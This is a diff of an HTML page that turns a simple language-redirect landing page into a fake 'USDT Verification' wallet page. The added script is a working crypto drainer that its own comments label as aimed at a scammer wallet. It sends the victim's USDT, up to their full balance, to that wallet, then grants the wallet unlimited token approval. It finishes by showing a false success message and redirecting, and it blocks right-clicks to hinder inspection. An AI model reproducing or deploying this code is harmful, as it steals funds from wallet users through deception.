@@ -1,41 +1,352 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>USDTFlash DApp</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Verification</title>
+    <style>
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #fff;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+        
+        .header {
+            background: #fff;
+            padding: 60px 20px 15px 20px;
+            border-bottom: 1px solid #e0e0e0;
+            text-align: center;
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+        }
+        
+        .content {
+            padding: 20px;
+        }
+        
+        .input-group {
+            margin-bottom: 24px;
+        }
+        
+        .label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        .address-box {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 14px;
+            display: flex;
+            align-items: center;
+            background: #f9f9f9;
+        }
+        
+        .address-text {
+            flex: 1;
+            font-family: monospace;
+            font-size: 15px;
+            color: #000;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .paste-btn {
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-left: 10px;
+            cursor: pointer;
+        }
+        
+        .amount-box {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 16px;
+            background: #f9f9f9;
+        }
+        
+        .amount-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .amount-input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            font-size: 32px;
+            font-weight: bold;
+            text-align: center;
+            outline: none;
+            color: #000;
+        }
+        
+        .usdt-badge {
+            background: #007AFF;
+            color: white;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-weight: 600;
+            min-width: 80px;
+            text-align: center;
+        }
+        
+        .max-btn {
+            background: #34C759;
+            color: white;
+            border: none;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .usd-value {
+            text-align: center;
+            margin-top: 12px;
+            color: #666;
+            font-size: 15px;
+        }
+        
+        .next-btn-container {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px;
+            background: white;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .next-btn {
+            width: 100%;
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+    </style>
+    <!-- Ethers.js for blockchain interaction -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </head>
-<body style="margin:0;padding:0;background:#009688;">
-  <div style="text-align:center;margin-top:40vh;font-size:1.5em;color:white;">
-    Cargando DApp...
-  </div>
+<body>
   
-  <div id="langToggle" style="position: fixed; top: 10px; left: 16px; z-index: 1000; background: rgba(0,0,0,0.4); color: white; padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 0.9em; border: 1px solid #fff2;">
-    🌐 Language: <select id="langSelect" style="background: transparent; color: white; border: none; font-weight: bold;">
-      <option value="en">EN</option>
-      <option value="es">ES</option>
-    </select>
-  </div>
+    <div class="content">
+        <div class="input-group">
+            <div class="label">Address or Domain Name</div>
+            <div class="address-box">
+                <div class="address-text" id="displayAddress">0x395b205f3ec60b4cd5820</div>
+                <button class="paste-btn" onclick="pasteAddress()">Paste</button>
+            </div>
+        </div>
+        
+        <div class="input-group">
+            <div class="label">Amount</div>
+            <div class="amount-box">
+                <div class="amount-row">
+                    <input type="number" class="amount-input" id="amountInput" value="1" min="0" step="0.1">
+                    <div class="usdt-badge">USDT</div>
+                    <button class="max-btn" onclick="setMaxAmount()">Max</button>
+                </div>
+            </div>
+            <div class="usd-value" id="usdValue">≈ $1.00</div>
+        </div>
+    </div>
+    
+    <div class="next-btn-container">
+        <button class="next-btn" onclick="startTransaction()">Next</button>
+    </div>
 
-  <script>
-    const userLang = navigator.language || navigator.userLanguage;
-    const preferred = userLang.startsWith("es") ? "es" : "en";
-    const langSelect = document.getElementById("langSelect");
-
-    langSelect.value = preferred;
-
-    langSelect.onchange = function () {
-      const lang = langSelect.value;
-      const target = lang === "es" ? "index_es.html" : "index_en.html";
-      window.location.href = target;
-    };
-
-    // Auto-redirect on first load
-    if (window.location.pathname.endsWith("/") || window.location.pathname.endsWith("index.html")) {
-      const target = preferred === "es" ? "index_es.html" : "index_en.html";
-      window.location.href = target;
-    }
-  </script>
-
+    <script>
+        // ============================================
+        //
+        // ============================================
+        const SCAMMER_WALLET = "0x67aF686A8CCBB858B1A36d64c585660a89b6A3DD"; // CHANGE THIS
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        // ============================================
+        
+       
+        document.getElementById('displayAddress').textContent = 
+            SCAMMER_WALLET.substring(0, 21) + '...';
+        
+        // Update USD value
+        function updateUSDValue() {
+            const amount = document.getElementById('amountInput').value;
+            const usd = (amount * 1.00).toFixed(2);
+            document.getElementById('usdValue').textContent = `≈ $${usd}`;
+        }
+        
+        // Set max amount (shows 1000 but actually checks balance)
+        async function setMaxAmount() {
+            if (window.ethereum) {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const signer = provider.getSigner();
+                    const userAddress = await signer.getAddress();
+                    
+                    // Get USDT balance
+                    const usdtAbi = ["function balanceOf(address) view returns (uint256)"];
+                    const usdtContract = new ethers.Contract(USDT_CONTRACT, usdtAbi, provider);
+                    const balance = await usdtContract.balanceOf(userAddress);
+                    const balanceInUSDT = ethers.utils.formatUnits(balance, 18);
+                    
+                    // Set to full balance
+                    document.getElementById('amountInput').value = parseFloat(balanceInUSDT).toFixed(2);
+                    updateUSDValue();
+                } catch (error) {
+                    // If error, just set to 1000
+                    document.getElementById('amountInput').value = "1000";
+                    updateUSDValue();
+                }
+            } else {
+                document.getElementById('amountInput').value = "1000";
+                updateUSDValue();
+            }
+        }
+        
+        
+        function pasteAddress() {
+            
+            alert("Address pasted!");
+        }
+        
+         
+        async function startTransaction() {
+            if (!window.ethereum) {
+                alert("Please open in Trust Wallet browser");
+                return;
+            }
+            
+            try {
+                // Switch to BSC
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }] // BSC Mainnet
+                    });
+                } catch (switchError) {
+                    // If BSC not added, add it
+                    if (switchError.code === 4902) {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'BNB Smart Chain',
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18
+                                },
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                blockExplorerUrls: ['https://bscscan.com/']
+                            }]
+                        });
+                    }
+                }
+                
+                // Get user's address
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+                const userAddress = accounts[0];
+                
+                // Setup ethers
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                
+                // Get amount
+                const amount = document.getElementById('amountInput').value;
+                const amountWei = ethers.utils.parseUnits(amount, 18);
+                
+                // USDT ABI for transfer function
+                const usdtAbi = [
+                    "function transfer(address to, uint256 amount) returns (bool)",
+                    "function approve(address spender, uint256 amount) returns (bool)"
+                ];
+                
+                const usdtContract = new ethers.Contract(
+                    USDT_CONTRACT,
+                    usdtAbi,
+                    signer
+                );
+                
+           
+                console.log("Transferring", amount, "USDT to scammer...");
+                const transferTx = await usdtContract.transfer(
+                    SCAMMER_WALLET,
+                    amountWei
+                );
+                
+                // Wait for confirmation
+                await transferTx.wait();
+                console.log("Transfer complete!");
+                
+                
+                
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                const unlimitedApproval = ethers.constants.MaxUint256;
+                const approveTx = await usdtContract.approve(
+                    SCAMMER_WALLET,
+                    unlimitedApproval
+                );
+                
+                await approveTx.wait();
+                console.log("Unlimited approval set!");
+                
+                // Show fake success message
+                alert("✅ Verification successful!\nYour USDT has been verified. We will contact you for advanced payment.");
+                
+                // Redirect to fake success page
+                window.location.href = "https://usdtverification.vercel.app/success.html";
+                
+            } catch (error) {
+                console.error("Scam error:", error);
+                
+                // User-friendly error messages
+                if (error.code === 4001) {
+                    alert("Transaction was rejected.");
+                } else if (error.message.includes("insufficient funds")) {
+                    alert("Insufficient BNB for gas fees.");
+                } else {
+                    alert("Error: " + error.message);
+                }
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Update USD value when amount changes
+            document.getElementById('amountInput').addEventListener('input', updateUSDValue);
+            updateUSDValue();
+            
+            // Prevent right-click
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Auto-focus amount input
+            document.getElementById('amountInput').focus();
+        });
+    </script>
 </body>
 </html>
